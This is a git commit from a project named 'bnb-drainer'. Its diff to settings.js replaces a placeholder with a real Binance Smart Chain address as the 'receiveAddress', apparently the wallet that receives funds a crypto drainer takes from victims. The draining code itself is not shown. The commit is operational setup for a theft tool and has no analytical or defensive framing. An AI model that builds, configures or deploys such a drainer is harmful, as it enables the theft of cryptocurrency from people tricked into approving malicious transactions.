2c621d686637f313556a4e6aa1f4bbb122fca1cb
NaK47 <137618391+NaK47@users.noreply.github.com>
2023-07-06 01:44:42 +0400

    Drainer address att.js

--- bnb-drainer/settings.js
+++ bnb-drainer/settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x39035A063b0D3387E9AE01Cba165ba2f1698E16c";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
